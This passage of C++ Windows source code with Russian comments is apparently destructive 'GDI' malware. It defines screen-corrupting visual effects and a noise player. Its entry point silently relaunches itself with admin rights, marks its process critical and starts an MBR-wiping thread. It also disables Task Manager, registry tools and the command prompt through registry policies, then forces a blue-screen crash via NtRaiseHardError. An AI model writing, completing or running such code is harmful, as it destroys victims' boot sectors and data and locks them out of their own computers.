        StretchBlt(hdc, (w - nw)/2, (h - nh)/2, nw, nh, memDC, 0, 0, w, h, SRCCOPY);
        for (int i = 0; i < 15; i++) {
            int x = rand() % w, y = rand() % h;
            int size = 5 + rand() % 30;
            BitBlt(hdc, x + rand() % 50 - 25, y + rand() % 50 - 25, size, size, memDC, x, y, NOTSRCCOPY);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 14: GLASS_SHATTER - оптимизирован
DWORD WINAPI glass_shatter(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int pieces[80][4];
    for (int i = 0; i < 80; i++) {
        pieces[i][0] = rand() % w;
        pieces[i][1] = rand() % h;
        pieces[i][2] = 10 + rand() % 30;
        pieces[i][3] = 10 + rand() % 30;
    }
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 80; i++) {
            pieces[i][0] += rand() % 5 - 2;
            pieces[i][1] += rand() % 5 - 2;
            if (pieces[i][0] < 0) pieces[i][0] = w;
            if (pieces[i][0] > w) pieces[i][0] = 0;
            if (pieces[i][1] < 0) pieces[i][1] = h;
            if (pieces[i][1] > h) pieces[i][1] = 0;
            StretchBlt(hdc, pieces[i][0], pieces[i][1], pieces[i][2], pieces[i][3],
                       memDC, pieces[i][0], pieces[i][1], pieces[i][2], pieces[i][3], NOTSRCCOPY);
        }
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(255, 255, 255));
        SelectObject(hdc, pen);
        for (int i = 0; i < 15; i++) {
            MoveToEx(hdc, rand() % w, rand() % h, NULL);
            LineTo(hdc, rand() % w, rand() % h);
        }
        DeleteObject(pen);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

// ЭФФЕКТ 15: NEON_GLOW - оптимизирован
DWORD WINAPI neon_glow(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int hue = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 3) {
            for (int x = 0; x < w; x += 3) {
                COLORREF color = GetPixel(memDC, x, y);
                int r = GetRValue(color) + 50 * sin(x * 0.01f + hue * 0.02f);
                int g = GetGValue(color) + 50 * cos(y * 0.01f + hue * 0.03f);
                int b = GetBValue(color) + 50 * sin((x + y) * 0.01f + hue * 0.04f);
                if (r > 255) r = 255;
                if (g > 255) g = 255;
                if (b > 255) b = 255;
                if (r < 0) r = 0;
                if (g < 0) g = 0;
                if (b < 0) b = 0;
                SetPixel(hdc, x, y, RGB(r, g, b));
                SetPixel(hdc, x + 1, y, RGB(r, g, b));
                SetPixel(hdc, x, y + 1, RGB(r, g, b));
            }
        }
        hue += 3;
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 16: THERMAL_VISION - оптимизирован
DWORD WINAPI thermal_vision(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                COLORREF color = GetPixel(memDC, x, y);
                int gray = (GetRValue(color) + GetGValue(color) + GetBValue(color)) / 3;
                int intensity = (gray * (x + y) / (w + h)) % 256;
                if (intensity > 200) {
                    SetPixel(hdc, x, y, RGB(255, 0, 0));
                } else if (intensity > 120) {
                    SetPixel(hdc, x, y, RGB(255, 255, 0));
                } else if (intensity > 60) {
                    SetPixel(hdc, x, y, RGB(0, 255, 0));
                } else {
                    SetPixel(hdc, x, y, RGB(0, 0, 255));
                }
            }
        }
        for (int i = 0; i < 300; i++) {
            SetPixel(hdc, rand() % w, rand() % h, RGB(rand() % 256, rand() % 256, rand() % 256));
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(12);
    }
    return 0;
}

// ЭФФЕКТ 17: GLITCH_WARP - оптимизирован
DWORD WINAPI glitch_warp(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    int glitchX = 0, glitchY = 0;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        glitchX += rand() % 11 - 5;
        glitchY += rand() % 11 - 5;
        if (glitchX > w / 3) glitchX = -w / 3;
        if (glitchX < -w / 3) glitchX = w / 3;
        if (glitchY > h / 3) glitchY = -h / 3;
        if (glitchY < -h / 3) glitchY = h / 3;
        StretchBlt(hdc, glitchX, glitchY, w, h, memDC, 0, 0, w, h, SRCCOPY);
        for (int i = 0; i < 15; i++) {
            int x = rand() % w;
            int y = rand() % h;
            int w2 = 5 + rand() % 20;
            int h2 = 2 + rand() % 10;
            BitBlt(hdc, x + rand() % 30 - 15, y, w2, h2, memDC, x, y, SRCINVERT);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(6);
    }
    return 0;
}

// ЭФФЕКТ 18: SCREEN_CRUSH - оптимизирован
DWORD WINAPI screen_crush(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(memDC, bmp);
    float crush = 1.0f;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        crush += 0.01f * (rand() % 3 - 1);
        if (crush > 2.0f) crush = 0.3f;
        if (crush < 0.2f) crush = 2.0f;
        int nw = (int)(w / crush);
        int nh = (int)(h * crush);
        if (nw < 1) nw = 1;
        if (nh < 1) nh = 1;
        StretchBlt(hdc, (w - nw)/2, (h - nh)/2, nw, nh, memDC, 0, 0, w, h, SRCCOPY);
        for (int y = 0; y < h; y += 2) {
            int shift = (int)(30 * sin(y * 0.1f + GetTickCount() * 0.005f));
            BitBlt(hdc, shift, y, w, 2, memDC, 0, y, SRCPAINT);
        }
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(8);
    }
    return 0;
}

// ЭФФЕКТ 19: DIGITAL_RAIN - оптимизирован
DWORD WINAPI digital_rain(LPVOID lpvd) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int columns = w / 8;
    int drops[256];
    for (int i = 0; i < 256; i++) drops[i] = rand() % h;
    while (1) {
        HDC hdc = GetDC(0);
        for (int i = 0; i < columns && i < 256; i++) {
            drops[i] += 2 + rand() % 5;
            if (drops[i] > h) drops[i] = 0;
            for (int j = 0; j < 15; j++) {
                int y = drops[i] - j;
                if (y >= 0 && y < h) {
                    COLORREF color = RGB(0, 255 - j * 15, 0);
                    if (j == 0) color = RGB(255, 255, 255);
                    SetPixel(hdc, i * 8 + rand() % 6, y, color);
                }
            }
        }
        BitBlt(hdc, 0, 0, w, h, hdc, rand() % 5 - 2, rand() % 5 - 2, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(15);
    }
    return 0;
}

// ==================== ЗВУКИ ====================

void PlayNoise(int freq, int duration) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    DWORD samples = 8000 * duration / 1000;
    char* buffer = new char[samples];
    for (DWORD i = 0; i < samples; i++) {
        buffer[i] = (char)(127 + 127 * sin((float)i * freq * 2 * M_PI / 8000));
    }
    WAVEHDR header = { buffer, samples, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

// ==================== ТОЧКА ВХОДА ====================

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Проверка прав администратора
    BOOL bIsAdmin = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &bIsAdmin);
        FreeSid(pAdmin);
    }
    if (!bIsAdmin) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = {sizeof(sei)};
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        ExitProcess(0);
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    ProcessIsCritical();
    CreateThread(0, 0, MBRWiper, 0, 0, 0);

    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", REG_DWORD, 2);

    CreateThread(0, 0, TimerThread, 0, 0, 0);

    srand(GetTickCount());
    
    // ====== ВСЕ ЭФФЕКТЫ ПО 20 СЕКУНД ======
    // 19 старых + 3 новых = 22 эффекта × 20 сек = 440 сек = 7 минут 20 секунд

    // СТАРЫЕ ЭФФЕКТЫ (1-19)
    HANDLE t0 = CreateThread(0, 0, screen_squeeze, 0, 0, 0); PlayNoise(200, 20000); Sleep(20000); TerminateThread(t0, 0); CloseHandle(t0);
    HANDLE t1 = CreateThread(0, 0, pixel_melt, 0, 0, 0); PlayNoise(300, 20000); Sleep(20000); TerminateThread(t1, 0); CloseHandle(t1);
    HANDLE t2 = CreateThread(0, 0, radial_blur, 0, 0, 0); PlayNoise(150, 20000); Sleep(20000); TerminateThread(t2, 0); CloseHandle(t2);
    HANDLE t3 = CreateThread(0, 0, screen_wipe, 0, 0, 0); PlayNoise(400, 20000); Sleep(20000); TerminateThread(t3, 0); CloseHandle(t3);
    HANDLE t4 = CreateThread(0, 0, floating_ui, 0, 0, 0); PlayNoise(250, 20000); Sleep(20000); TerminateThread(t4, 0); CloseHandle(t4);
    HANDLE t5 = CreateThread(0, 0, cubic_distortion, 0, 0, 0); PlayNoise(350, 20000); Sleep(20000); TerminateThread(t5, 0); CloseHandle(t5);
    HANDLE t6 = CreateThread(0, 0, wave_ripple, 0, 0, 0); PlayNoise(100, 20000); Sleep(20000); TerminateThread(t6, 0); CloseHandle(t6);
    HANDLE t7 = CreateThread(0, 0, screen_twirl, 0, 0, 0); PlayNoise(280, 20000); Sleep(20000); TerminateThread(t7, 0); CloseHandle(t7);
    HANDLE t8 = CreateThread(0, 0, color_explosion, 0, 0, 0); PlayNoise(500, 20000); Sleep(20000); TerminateThread(t8, 0); CloseHandle(t8);
    HANDLE t9 = CreateThread(0, 0, pixel_sorting, 0, 0, 0); PlayNoise(180, 20000); Sleep(20000); TerminateThread(t9, 0); CloseHandle(t9);
    HANDLE t10 = CreateThread(0, 0, ghost_trail, 0, 0, 0); PlayNoise(220, 20000); Sleep(20000); TerminateThread(t10, 0); CloseHandle(t10);
    HANDLE t11 = CreateThread(0, 0, screen_flip, 0, 0, 0); PlayNoise(320, 20000); Sleep(20000); TerminateThread(t11, 0); CloseHandle(t11);
    HANDLE t12 = CreateThread(0, 0, zoom_burst, 0, 0, 0); PlayNoise(450, 20000); Sleep(20000); TerminateThread(t12, 0); CloseHandle(t12);
    HANDLE t13 = CreateThread(0, 0, glass_shatter, 0, 0, 0); PlayNoise(600, 20000); Sleep(20000); TerminateThread(t13, 0); CloseHandle(t13);
    HANDLE t14 = CreateThread(0, 0, neon_glow, 0, 0, 0); PlayNoise(170, 20000); Sleep(20000); TerminateThread(t14, 0); CloseHandle(t14);
    HANDLE t15 = CreateThread(0, 0, thermal_vision, 0, 0, 0); PlayNoise(130, 20000); Sleep(20000); TerminateThread(t15, 0); CloseHandle(t15);
    HANDLE t16 = CreateThread(0, 0, glitch_warp, 0, 0, 0); PlayNoise(380, 20000); Sleep(20000); TerminateThread(t16, 0); CloseHandle(t16);
    HANDLE t17 = CreateThread(0, 0, screen_crush, 0, 0, 0); PlayNoise(420, 20000); Sleep(20000); TerminateThread(t17, 0); CloseHandle(t17);
    HANDLE t18 = CreateThread(0, 0, digital_rain, 0, 0, 0); PlayNoise(120, 20000); Sleep(20000); TerminateThread(t18, 0); CloseHandle(t18);

    // НОВЫЕ ЭФФЕКТЫ (20-22)
    HANDLE t19 = CreateThread(0, 0, spin_crush, 0, 0, 0); PlayNoise(550, 20000); Sleep(20000); TerminateThread(t19, 0); CloseHandle(t19);
    HANDLE t20 = CreateThread(0, 0, fast_wave, 0, 0, 0); PlayNoise(650, 20000); Sleep(20000); TerminateThread(t20, 0); CloseHandle(t20);
    HANDLE t21 = CreateThread(0, 0, radial_explosion, 0, 0, 0); PlayNoise(750, 20000); Sleep(20000); TerminateThread(t21, 0); CloseHandle(t21);

    // ====== 100% BSOD ======
    BOOLEAN bl;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(19, 1, 0, &bl);
        NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
    }

    Sleep(-1);
    return 0;
}